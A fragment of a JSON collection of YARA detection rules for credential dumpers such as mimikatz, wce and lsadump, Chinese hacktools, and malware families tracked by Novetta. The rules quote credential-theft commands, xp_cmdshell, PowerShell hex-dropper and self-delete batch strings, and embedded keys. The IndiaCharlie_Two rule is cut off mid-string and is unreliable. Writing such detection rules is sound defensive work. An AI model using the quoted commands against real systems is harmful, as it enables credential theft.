  "CN_Toolset_NTscan_PipeCmd": "rule CN_Toolset_NTscan_PipeCmd {\n\tmeta:\n\t\tdescription = \"Detects a Chinese hacktool from a disclosed toolset - file PipeCmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://qiannao.com/ls/905300366/33834c0c/\"\n\t\treference2 = \"https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar\"\n\t\tdate = \"2015/03/30\"\n\t\tscore = 70\n\t\thash = \"a931d65de66e1468fe2362f7f2e0ee546f225c4e\"\n\tstrings:\n\t\t$s2 = \"Please Use NTCmd.exe Run This Program.\" fullword ascii\n\t\t$s3 = \"PipeCmd.exe\" fullword wide\n\t\t$s4 = \"\\\\\\\\.\\\\pipe\\\\%s%s%d\" fullword ascii\n\t\t$s5 = \"%s\\\\pipe\\\\%s%s%d\" fullword ascii\n\t\t$s6 = \"%s\\\\ADMIN$\\\\System32\\\\%s%s\" fullword ascii\n\t\t$s7 = \"%s\\\\ADMIN$\\\\System32\\\\%s\" fullword ascii\n\t\t$s9 = \"PipeCmdSrv.exe\" fullword ascii\n\t\t$s10 = \"This is a service executable! Couldn't start directly.\" fullword ascii\n\t\t$s13 = \"\\\\\\\\.\\\\pipe\\\\PipeCmd_communicaton\" fullword ascii\n\t\t$s14 = \"PIPECMDSRV\" fullword wide\n\t\t$s15 = \"PipeCmd Service\" fullword ascii\n\tcondition:\n\t\t4 of them\n}",
  "CN_Toolset_LScanPortss_2": "rule CN_Toolset_LScanPortss_2 {\n\tmeta:\n\t\tdescription = \"Detects a Chinese hacktool from a disclosed toolset - file LScanPortss.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://qiannao.com/ls/905300366/33834c0c/\"\n\t\treference2 = \"https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar\"\n\t\tdate = \"2015/03/30\"\n\t\tscore = 70\n\t\thash = \"4631ec57756466072d83d49fbc14105e230631a0\"\n\tstrings:\n\t\t$s1 = \"LScanPort.EXE\" fullword wide\n\t\t$s3 = \"www.honker8.com\" fullword wide\n\t\t$s4 = \"DefaultPort.lst\" fullword ascii\n\t\t$s5 = \"Scan over.Used %dms!\" fullword ascii\n\t\t$s6 = \"www.hf110.com\" fullword wide\n\t\t$s15 = \"LScanPort Microsoft \" fullword wide\n\t\t$s18 = \"L-ScanPort2.0 CooFly\" fullword wide\n\tcondition:\n\t\t4 of them\n}",
  "CN_Toolset_sig_1433_135_sqlr": "rule CN_Toolset_sig_1433_135_sqlr {\n\tmeta:\n\t\tdescription = \"Detects a Chinese hacktool from a disclosed toolset - file sqlr.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://qiannao.com/ls/905300366/33834c0c/\"\n\t\treference2 = \"https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar\"\n\t\tdate = \"2015/03/30\"\n\t\tscore = 70\n\t\thash = \"8542c7fb8291b02db54d2dc58cd608e612bfdc57\"\n\tstrings:\n\t\t$s0 = \"Connect to %s MSSQL server success. Type Command at Prompt.\" fullword ascii\n\t\t$s11 = \";DATABASE=master\" fullword ascii\n\t\t$s12 = \"xp_cmdshell '\" fullword ascii\n\t\t$s14 = \"SELECT * FROM OPENROWSET('SQLOLEDB','Trusted_Connection=Yes;Data Source=myserver\" ascii\n\tcondition:\n\t\tall of them\n}",
  "Mimikatz_Memory_Rule_1": "rule Mimikatz_Memory_Rule_1 : APT {\n\tmeta:\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"12/22/2014\"\n\t\tscore = 70\n\t\ttype = \"memory\"\n\t\tdescription = \"Detects password dumper mimikatz in memory\"\n\tstrings:\n\t\t$s1 = \"sekurlsa::msv\" fullword ascii\n\t    $s2 = \"sekurlsa::wdigest\" fullword ascii\n\t    $s4 = \"sekurlsa::kerberos\" fullword ascii\n\t    $s5 = \"sekurlsa::tspkg\" fullword ascii\n\t    $s6 = \"sekurlsa::livessp\" fullword ascii\n\t    $s7 = \"sekurlsa::ssp\" fullword ascii\n\t    $s8 = \"sekurlsa::logonPasswords\" fullword ascii\n\t    $s9 = \"sekurlsa::process\" fullword ascii\n\t    $s10 = \"ekurlsa::minidump\" fullword ascii\n\t    $s11 = \"sekurlsa::pth\" fullword ascii\n\t    $s12 = \"sekurlsa::tickets\" fullword ascii\n\t    $s13 = \"sekurlsa::ekeys\" fullword ascii\n\t    $s14 = \"sekurlsa::dpapi\" fullword ascii\n\t    $s15 = \"sekurlsa::credman\" fullword ascii\n\tcondition:\n\t\t1 of them\n}",
  "Mimikatz_Memory_Rule_2": "rule Mimikatz_Memory_Rule_2 : APT {\n\tmeta:\n\t\tdescription = \"Mimikatz Rule generated from a memory dump\"\n\t\tauthor = \"Florian Roth - Florian Roth\"\n\t\ttype = \"memory\"\n\t\tscore = 80\n\tstrings:\n\t\t$s0 = \"sekurlsa::\" ascii\n\t\t$x1 = \"cryptprimitives.pdb\" ascii\n\t\t$x2 = \"Now is t1O\" ascii fullword\n\t\t$x4 = \"ALICE123\" ascii\n\t\t$x5 = \"BOBBY456\" ascii\n\tcondition:\n\t\t$s0 and 1 of ($x*)\n}",
  "mimikatz": "rule mimikatz\n{\n\tmeta:\n\t\tdescription\t\t= \"mimikatz\"\n\t\tauthor\t\t\t= \"Benjamin DELPY (gentilkiwi)\"\n\t\ttool_author\t\t= \"Benjamin DELPY (gentilkiwi)\"\n      score          = 80\n\tstrings:\n\t\t$exe_x86_1\t\t= { 89 71 04 89 [0-3] 30 8d 04 bd }\n\t\t$exe_x86_2\t\t= { 89 79 04 89 [0-3] 38 8d 04 b5 }\n\n\t\t$exe_x64_1\t\t= { 4c 03 d8 49 [0-3] 8b 03 48 89 }\n\t\t$exe_x64_2\t\t= { 4c 8b df 49 [0-3] c1 e3 04 48 [0-3] 8b cb 4c 03 [0-3] d8 }\n\n\t\t$dll_1\t\t\t= { c7 0? 00 00 01 00 [4-14] c7 0? 01 00 00 00 }\n\t\t$dll_2\t\t\t= { c7 0? 10 02 00 00 ?? 89 4? }\n\n\t\t$sys_x86\t\t= { a0 00 00 00 24 02 00 00 40 00 00 00 [0-4] b8 00 00 00 6c 02 00 00 40 00 00 00 }\n\t\t$sys_x64\t\t= { 88 01 00 00 3c 04 00 00 40 00 00 00 [0-4] e8 02 00 00 f8 02 00 00 40 00 00 00 }\n\n\tcondition:\n\t\t(all of ($exe_x86_*)) or (all of ($exe_x64_*)) or (all of ($dll_*)) or (any of ($sys_*))\n}",
  "mimikatz_lsass_mdmp": "rule mimikatz_lsass_mdmp\n{\n\tmeta:\n\t\tdescription\t\t= \"LSASS minidump file for mimikatz\"\n\t\tauthor\t\t\t= \"Benjamin DELPY (gentilkiwi)\"\n\n\tstrings:\n\t\t$lsass\t\t\t= \"System32\\\\lsass.exe\"\twide nocase\n\n\tcondition:\n\t\t(uint32(0) == 0x504d444d) and $lsass\n}",
  "wce": "rule wce\n{\n\tmeta:\n\t\tdescription\t\t= \"wce\"\n\t\tauthor\t\t\t= \"Benjamin DELPY (gentilkiwi)\"\n\t\ttool_author\t\t= \"Hernan Ochoa (hernano)\"\n\n\tstrings:\n\t\t$hex_legacy\t\t= { 8b ff 55 8b ec 6a 00 ff 75 0c ff 75 08 e8 [0-3] 5d c2 08 00 }\n\t\t$hex_x86\t\t= { 8d 45 f0 50 8d 45 f8 50 8d 45 e8 50 6a 00 8d 45 fc 50 [0-8] 50 72 69 6d 61 72 79 00 }\n\t\t$hex_x64\t\t= { ff f3 48 83 ec 30 48 8b d9 48 8d 15 [0-16] 50 72 69 6d 61 72 79 00 }\n\n\tcondition:\n\t\tany of them\n}",
  "lsadump": "rule lsadump\n{\n\tmeta:\n\t\tdescription\t\t= \"LSA dump programe (bootkey/syskey) - pwdump and others\"\n\t\tauthor\t\t\t= \"Benjamin DELPY (gentilkiwi)\"\n\n\tstrings:\n\t\t$str_sam_inc\t= \"\\\\Domains\\\\Account\" ascii nocase\n\t\t$str_sam_exc\t= \"\\\\Domains\\\\Account\\\\Users\\\\Names\\\\\" ascii nocase\n\t\t$hex_api_call\t= {(41 b8 | 68) 00 00 00 02 [0-64] (68 | ba) ff 07 0f 00 }\n\t\t$str_msv_lsa\t= { 4c 53 41 53 52 56 2e 44 4c 4c 00 [0-32] 6d 73 76 31 5f 30 2e 64 6c 6c 00 }\n\t\t$hex_bkey\t\t= { 4b 53 53 4d [20-70] 05 00 01 00}\n\n\tcondition:\n\t\t( ($str_sam_inc and not $str_sam_exc) or $hex_api_call or $str_msv_lsa or $hex_bkey )\n      and not uint16(0) == 0x5a4d\n}",
  "Mimikatz_Logfile": "rule Mimikatz_Logfile\n{\n\tmeta:\n\t\tdescription = \"Detects a log file generated by malicious hack tool mimikatz\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 80\n\t\tdate = \"2015/03/31\"\n\t\treference = \"https://github.com/Neo23x0/Loki/blob/master/signatures/thor-hacktools.yar\"\n\tstrings:\n\t\t$s1 = \"SID               :\" ascii fullword\n\t\t$s2 = \"* NTLM     :\" ascii fullword\n\t\t$s3 = \"Authentication Id :\" ascii fullword\n\t\t$s4 = \"wdigest :\" ascii fullword\n\tcondition:\n\t\tall of them\n}",
  "AppInitHook": "rule AppInitHook {\n\tmeta:\n\t\tdescription = \"AppInitGlobalHooks-Mimikatz - Hide Mimikatz From Process Lists - file AppInitHook.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"https://goo.gl/Z292v6\"\n\t\tdate = \"2015-07-15\"\n\t\tscore = 70\n\t\thash = \"e7563e4f2a7e5f04a3486db4cefffba173349911a3c6abd7ae616d3bf08cfd45\"\n\tstrings:\n\t\t$s0 = \"\\\\Release\\\\AppInitHook.pdb\" ascii\n\t\t$s1 = \"AppInitHook.dll\" fullword ascii\n\t\t$s2 = \"mimikatz.exe\" fullword wide\n\t\t$s3 = \"]X86Instruction->OperandSize >= Operand->Length\" fullword wide\n\t\t$s4 = \"mhook\\\\disasm-lib\\\\disasm.c\" fullword wide\n\t\t$s5 = \"mhook\\\\disasm-lib\\\\disasm_x86.c\" fullword wide\n\t\t$s6 = \"VoidFunc\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 500KB and 4 of them\n}",
  "VSSown_VBS": "rule VSSown_VBS {\n\tmeta:\n\t\tdescription = \"Detects VSSown.vbs script - used to export shadow copy elements like NTDS to take away and crack elsewhere\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"2015-10-01\"\n\t\tscore = 75\n\tstrings:\n\t\t$s0 = \"Select * from Win32_Service Where Name ='VSS'\" ascii\n\t\t$s1 = \"Select * From Win32_ShadowCopy\" ascii\n\t\t$s2 = \"cmd /C mklink /D \" ascii\n\t\t$s3 = \"ClientAccessible\" ascii\n\t\t$s4 = \"WScript.Shell\" ascii\n\t\t$s5 = \"Win32_Process\" ascii\n\tcondition:\n\t\tall of them\n}",
  "Payload_Exe2Hex": "rule Payload_Exe2Hex : toolkit {\n\tmeta:\n\t\tdescription = \"Detects payload generated by exe2hex\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"https://github.com/g0tmi1k/exe2hex\"\n\t\tdate = \"2016-01-15\"\n\t\tscore = 70\n\tstrings:\n\t\t$a1 = \"set /p \\\"=4d5a\" ascii\n\t\t$a2 = \"powershell -Command \\\"$hex=\" ascii\n\t\t$b1 = \"set+%2Fp+%22%3D4d5\" ascii\n\t\t$b2 = \"powershell+-Command+%22%24hex\" ascii\n\t\t$c1 = \"echo 4d 5a \" ascii\n\t\t$c2 = \"echo r cx >>\" ascii\n\t\t$d1 = \"echo+4d+5a+\" ascii\n\t\t$d2 = \"echo+r+cx+%3E%3E\" ascii\n\tcondition:\n\t\tall of ($a*) or all of ($b*) or all of ($c*) or all of ($d*)\n}",
  "DeltaCharlie": "rule DeltaCharlie\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$rsaKey = {7B 4E 1E A7 E9 3F 36 4C DE F4 F0 99 C4 D9 B7 94 A1 FF F2 97 D3 91 13 9D C0 12 02 E4 4C BB 6C 77 48 EE 6F 4B  73 D7 1A 44 13 B3 6A BB 61 44 AF 31 47 E7 87 C2 AE 7A A7 2C 3A D9 5C 2E 42 1A A6 78 FE 2C AD ED 39 3F FA D0 AD 3D D9 C5 3F 58 A0 19 27 CC 27 C9 E8 D8 1E 7E EE 91 DD 13 B3 47 EF 57 1A CA FF 9A 60 E0 64 08 AA E2 92 D0}\n\t\t           \n\tcondition:\n\t\tany of them\n}",
  "HotelAlfa": "rule HotelAlfa\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"58dab205ecb1e0972027eb92f68cec6d208e5ab5.ex_\"\n\n\tstrings:\n\t\n\t$resourceHTML = \"RSRC_HTML\"\n\t/*\n\t\t8A 0C 18  mov     cl, [eax+ebx]\n\t\t80 F1 63  xor     cl, 63h\n\t\t88 0C 18  mov     [eax+ebx], cl\n\t\t8B 4D 00  mov     ecx, [ebp+0]\n\t\t40        inc     eax\n\t\t3B C1     cmp     eax, ecx\n\t\t72 EF     jb      short loc_4010B4\n\t*/\n\n\t$rscsDecoderLoop = {8A [2] 80 F1 ?? 88 [2] 8B [2] 40 3B ?? 72 EF}\n\n\tcondition:\n\t\t$resourceHTML and $rscsDecoderLoop in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "IndiaAlfa_One": "rule IndiaAlfa_One\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$ = \"HwpFilePathCheck.dll\"\n\t\t$ = \"AdobeArm.exe\"\n\t\t$ = \"OpenDocument\"\n\t\t\n\tcondition:\n\t\t2 of them\n\n}",
  "IndiaAlfa_Two": "rule IndiaAlfa_Two\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$ = \"ExePath: %s\\nXlsPath: %s\\nTmpPath: %s\\n\"\n\t\t\n\tcondition:\n\t\tany of them\n\n}",
  "IndiaBravo_PapaAlfa": "rule IndiaBravo_PapaAlfa\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$ = \"pmsconfig.msi\" wide\n\t\t$ = \"scvrit001.bat\"\n\tcondition:\n\t\tall of them\n}",
  "IndiaBravo_RomeoCharlie": "rule IndiaBravo_RomeoCharlie\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"58ad28ac4fb911abb6a20382456c4ad6fe5c8ee5.ex_\"\n\t\tStatus = \"Signature is too loose to be useful.\"\n\t\t\n\tstrings:\n\t/*\n\t\t50                 push    eax             ; argp\n\t\t68 7E 66 04 80     push    8004667Eh       ; cmd\n\t\t8B 8D DC FE FF FF  mov     ecx, [ebp+skt]\n\t\t51                 push    ecx             ; s\n\t\tFF 15 58 31 41 00  call    ioctlsocket\n\t\t83 F8 FF           cmp     eax, 0FFFFFFFFh\n\t\t75 08              jnz     short loc_4043F0\n\t*/\n\n\t$a = {50 68 7E 66 04 80 8B 8D [4] 51 FF 15 [4] 83 F8 FF 75}\n\t$b1 = \"xc123465-efff-87cc-37abcdef9\"\n\t$b2 = \"[Check] - PORT ERROR...\" wide\n\t$b3 = \"%sd.e%sc n%ssh%srewa%s ad%s po%sop%sing T%s %d\"\n\n\tcondition:\n\t\t2 of ($b*) or \n\t\t$a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "IndiaBravo_RomeoBravo": "rule IndiaBravo_RomeoBravo\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"6e3db4da27f12eaba005217eba7cd9133bc258c97fe44605d12e20a556775009\"\n\n\tstrings:\n\t/*\n\t\tE8 C3 FE FF FF     call    generate64ByteRandomNumber\n\t\t68 C8 01 00 00     push    1C8h            ; dwLength\n\t\t68 D8 E8 40 00     push    offset g_Config ; pvBuffer\n\t\tA3 80 EA 40 00     mov     dword ptr g_Config.qwIdentifier, eax\n\t\t89 15 84 EA 40 00  mov     dword ptr g_Config.qwIdentifier+4, edx\n\t\tE8 F9 E9 FF FF     call    DNSCALCDecode\n\t\t83 C4 08           add     esp, 8\n\t\t8D 4C 24 08        lea     ecx, [esp+214h+var_20C]\n\t\t6A 00              push    0\n\t\t51                 push    ecx\n\t\t68 C8 01 00 00     push    1C8h\n\t\t68 D8 E8 40 00     push    offset g_Config\n\t\t56                 push    esi\n\t\tFF 15 74 E7 40 00  call    WriteFile_9\n\t\t56                 push    esi\n\t\tFF 15 6C E7 40 00  call    CloseHandle_9\n\t*/\n\n\t$a = {E8 [4] 68 [2] 00 00 68 [4] A3 [4]\t89 15 [4] E8 [4] 83 C4 08 8D [3] 6A 00 5? 68 [2] 00 00 \t68 [4] 5? FF 15 [4] 5? \tFF 15}\n\t\t\n\t\t$b1 = \"tmscompg.msi\" wide\n\t\t$b2 = \"cvrit000.bat\"\n\n\tcondition:\n\t\t2 of ($b*) or \n\t\t$a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "IndiaBravo_generic": "rule IndiaBravo_generic\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$extractDll = \"[2] - Extract Dll...\" wide\n\t\t$createSvc = \"[3] - CreateSVC...\" wide\n\n\tcondition:\n\t\tall of them\n\t\n}",
  "IndiaCharlie_One": "rule IndiaCharlie_One\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$ = \"WMPNetworkSvcUpdate\"\n\t\t$ = \"backSched.dll\"\n\t\t$ = \"\\\\mspaint.exe\"\n\t\t$aesKey = \"X,LLIe{))%%l2i<[AM|aq!Ql/lPlw]d7@C-#j.<c|#*}Kx4_H(q^F-F^p/[t#%HT\"\n\tcondition:\n\t\t2 of them or $aesKey\n}",
  "IndiaCharlie_Two": "rule IndiaCharlie_Two\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$s1 = \"%s is an essential element in Windows System configuration and management. %s\"\n\t\t$s2 = \"%SYSTEMROOT%\\\\system32\\\\svchost.exe -k \"\n\t\t$s3 = \"%s\\\\system32\\\\%s\"\n\t\t$s4 = \"\\\\mspaint.exe\"\n\t\t$s5 = \":R\\nIF NOT EXIST %s GOTO E\\ndel /a %s\\nGOTO R\\n:E\\ndel /a d.bat\"\n\t\t$aesKey = \"}",
  "IndiaDelta": "rule IndiaDelta\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"d7b50b1546653bff68220996190446bdc7fc4e38373715b8848d1fb44fe3f53c\"\n\n\tstrings:\n\t/*\n\t\tFF 15 DC 2D 41 00  call    ReadFile_0\n\t\t8B 44 24 20        mov     eax, [esp+25Ch+offsetInFile]\n\t\t8B 54 24 1C        mov     edx, [esp+25Ch+dwEmbedCnt]\n\t\t35 78 56 34 12     xor     eax, 12345678h\n\t\t55                 push    ebp\n\t\t55                 push    ebp\n\t\t81 F2 78 56 34 12  xor     edx, 12345678h\n\t\t50                 push    eax\n\t\t57                 push    edi\n\t\t89 54 24 2C        mov     [esp+26Ch+dwEmbedCnt], edx\n\t\t89 44 24 30        mov     [esp+26Ch+offsetInFile], eax\n\t\tFF 15 E0 2D 41 00  call    SetFilePointer_0\n\t*/\n\n\t$a =   {FF 15 [4-12] 3? 78 56 34 12 [0-2] 8? ?? 78 56 34 12 [0-10] FF 15}\n\n\tcondition:\n\t\t$a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "IndiaEcho": "rule IndiaEcho\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"66a21f8c72bb4f314604526e9bf1736f75b06cf37dd3077eb292941b476c3235\"\n\n\tstrings:\n\t/*\n\t\t69 C0 28 01 00 00  imul    eax, 128h\n\t\t50                 push    eax             ; size_t\n\t\t53                 push    ebx             ; int\n\t\tFF B5 AC FD FF FF  push    [ebp+configRecords]; void *\n\t\tE8 6E 08 00 00     call    _memset\n\t\t8B 85 A4 FC FF FF  mov     eax, [ebp+var_35C.dwRecordCnt]\n\t\t69 C0 28 01 00 00  imul    eax, 128h\n\t\t50                 push    eax             ; size_t\n\t\t8B 85 C4 FE FF FF  mov     eax, [ebp+hMem]\n\t\t05 08 01 00 00     add     eax, 108h\n\t\t50                 push    eax             ; void *\n\t\tFF B5 AC FD FF FF  push    [ebp+configRecords]; void *\n\t\tE8 0A 05 00 00     call    _memcpy\n\t\t83 C4 18           add     esp, 18h\n\t\t8B BD A4 FC FF FF  mov     edi, [ebp+var_35C.dwRecordCnt]\n\t\t69 FF 28 01 00 00  imul    edi, 128h\n\t\t81 C7 08 01 00 00  add     edi, 108h\n\t*/\n\n\t$a = {69 ?? 28 01 00 00 5? 5? FF B5 [4] E8 [4] 8B [5] 69 ?? 28 01 00 00\t50 8B [5] (05 08 01 00 00 | 03 ??) 50 FF [5] E8 [4] 83 C4 ?? 8B [5] 69 ?? 28 01 00 00 (81 C7 08 01 00 00 | 03 ??)}\n\n\tcondition:\n\t\t$a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "IndiaGolf": "rule IndiaGolf\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"3dda69dfb254dcaea2ba6e8323d4b61ab1e130a0694f4c43d336cfb86a760c50\"\n\n\tstrings:\n\t/*\n\t\tFF D6        call    esi ; rand\n\t\t8B F8        mov     edi, eax\n\t\tC1 E7 10     shl     edi, 10h\n\t\tFF D6        call    esi ; rand\n\t\t03 F8        add     edi, eax\n\t\t89 7C 24 20  mov     [esp+2A90h+var_2A70], edi\n\t\tFF D6        call    esi ; rand\n\t\t8B F8        mov     edi, eax\n\t\tC1 E7 10     shl     edi, 10h\n\t\tFF D6        call    esi ; rand\n\t\t03 F8        add     edi, eax\n\t\t89 7C 24 24  mov     [esp+2A90h+var_2A6C], edi\n\t*/\n\n\t$generateRandomID = {FF ?? 8B ?? C1 ?? 10 FF ?? 03 F8 89 [3] FF ?? 8B ?? C1 ?? 10 FF ?? 03 ?? 89}\n\n\tcondition:\n\t\t$generateRandomID in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "IndiaHotel": "rule IndiaHotel\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"8a4fc5007faf85e07710dca705108df9fd6252fe3d57dfade314120d72f6d83f\"\n\n\tstrings:\n\t/*\n\t\t6A 0A              push    0Ah             ; int\n\t\t8D 85 C4 E4 FF FF  lea     eax, [ebp+Source]\n\t\t68 10 02 00 00     push    210h            ; unsigned int\n\t\t50                 push    eax             ; void *\n\t\tE8 FA 60 00 00     call    ??_L@YGXPAXIHP6EX0@Z1@Z; `eh vector constructor iterator'(void *,uint,int,void (*)(void *),void (*)(void *))\n\t*/\n\n\t$fileExtractorArraySetup = {6A 0A 8D [5-6] 68 10 02 00 00 50 E8}\n\n\tcondition:\n\t\t$fileExtractorArraySetup in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}",
  "IndiaJuliett_1": "rule IndiaJuliett_1\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource_writeFile = \"a164c0ba0be7c33778c12a6457e9c55a2935564a\"\n\n\n\tstrings:\n\t\t$configFilename = {00 73 63 61 72 64 70 72 76  2E 64 6C 6C 00}\n\t\t$suicideScript = \":R\\nIF NOT EXIST %s GOTO E\\ndel /a %s\\nGOTO R\\n:E\\ndel /a d.bat\"\n\t\t$commKey = { 10 20 30 40 50 60 70 80 90 11 12 13 1A FF EE 48 }\n\t\t/*\n\t\t.text:10001850                 push    7530h           ; dwTimeout\n\t\t.text:10001855                 lea     eax, [esp+420h+a2]\n\t\t.text:10001859                 push    4               ; len\n\t\t.text:1000185B                 push    eax             ; a2\n\t\t.text:1000185C                 push    esi             ; s\n\t\t.text:1000185D                 mov     dword ptr [esp+42Ch+a2], 1000h\n\t\t.text:10001865                 call    CommSendWithTimeout\n\t\t.text:1000186A                 add     esp, 14h\n\t\t.text:1000186D                 cmp     eax, 0FFFFFFFFh\n\t\t.text:10001870                 jz      loc_10001915\n\t\t.text:10001876                 lea     ecx, [esp+418h+random]\n\t\t.text:1000187A                 push    ecx             ; a1\n\t\t.text:1000187B                 call    Generate16ByteRandomBuffer\n\t\t.text:10001880                 push    0               ; fEncrypt\n\t\t.text:10001882                 push    7530h           ; dwTimeout\t\t\n\t\t*/\n\t\t$handshake = { 68 30 75 00 00 [4] 6A 04 5? 5? C? [3] 00 10 00 00 E8 [7] 83 F8 FF 0F 84 ?? ?? 00 00 8? [3] 5? E8 [4] 6A 00 68 30 75 00 00 }\n\n\t\t/*\n\t\t\t68 00 28 00 00     push    2800h\n\t\t\t56                 push    esi\n\t\t\tE8 38 F7 FF FF     call    sub_401000\n\t\t\t// optionally there is a \"add esp, 8\" in some variants here\n\t\t\t8D 44 24 28        lea     eax, [esp+270h+NumberOfBytesWritten]\n\t\t\t6A 00              push    0               ; lpOverlapped\n\t\t\t50                 push    eax             ; lpNumberOfBytesWritten\n\t\t\t68 00 28 00 00     push    2800h           ; nNumberOfBytesToWrite\n\t\t\t56                 push    esi             ; lpBuffer\n\t\t\t53                 push    ebx             ; hFile\n\t\t\tFF 15 6C 80 40 00  call    ds:WriteFile\n\t\t\t81 ED 00 28 00 00  sub     ebp, 2800h\n\t\t\t81 C7 00 28 00 00  add     edi, 2800h\n\t\t\t81 C6 00 28 00 00  add     esi, 2800h\n\t\t*/\n\t\n\t\t$writeFile = {68 00 28 00 00 5?\tE8 [4-7] 8D [3] 6A 00 5? 68 00 28 00 00 5? 5? FF 15 [4] 81 ?? 00 28 00 00 81 ?? 00 28 00 00 81 ?? 00 28 00 00}\n\t\t\t\t\n\tcondition:\n\t\t($configFilename in ((pe.sections[pe.section_index(\".data\")].raw_data_offset)..(pe.sections[pe.section_index(\".data\")].raw_data_offset + pe.sections[pe.section_index(\".data\")].raw_data_size)) or \n\t\t\t$suicideScript in ((pe.sections[pe.section_index(\".data\")].raw_data_offset)..(pe.sections[pe.section_index(\".data\")].raw_data_offset + pe.sections[pe.section_index(\".data\")].raw_data_size)))\n\t\tor\n\t\t($handshake in ((pe.sections[pe.section_index(\".rsrc\")].raw_data_offset)..(pe.sections[pe.section_index(\".rsrc\")].raw_data_offset + pe.sections[pe.section_index(\".rsrc\")].raw_data_size)) and \n\t\t\t$commKey in ((pe.sections[pe.section_index(\".rsrc\")].raw_data_offset)..(pe.sections[pe.section_index(\".rsrc\")].raw_data_offset + pe.sections[pe.section_index(\".rsrc\")].raw_data_size)))\n\t\tor\n\t\t $writeFile in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n\n}",
